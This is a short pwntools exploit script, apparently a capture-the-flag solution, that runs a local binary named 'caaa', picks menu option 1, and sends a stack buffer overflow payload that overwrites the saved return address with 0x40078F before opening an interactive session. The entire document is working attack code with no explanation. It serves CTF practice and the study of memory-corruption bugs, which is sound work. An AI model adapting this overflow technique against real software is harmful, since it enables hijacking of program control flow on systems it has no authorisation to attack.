from pwn import *
context.log_level = 'debug'

cn = process('./caaa')

cn.recv()
cn.sendline('1')

pay = 'a'*0x20 + 'bbbbbbbb'+ p64(0x000000000040078F)
cn.sendline(pay)

cn.interactive()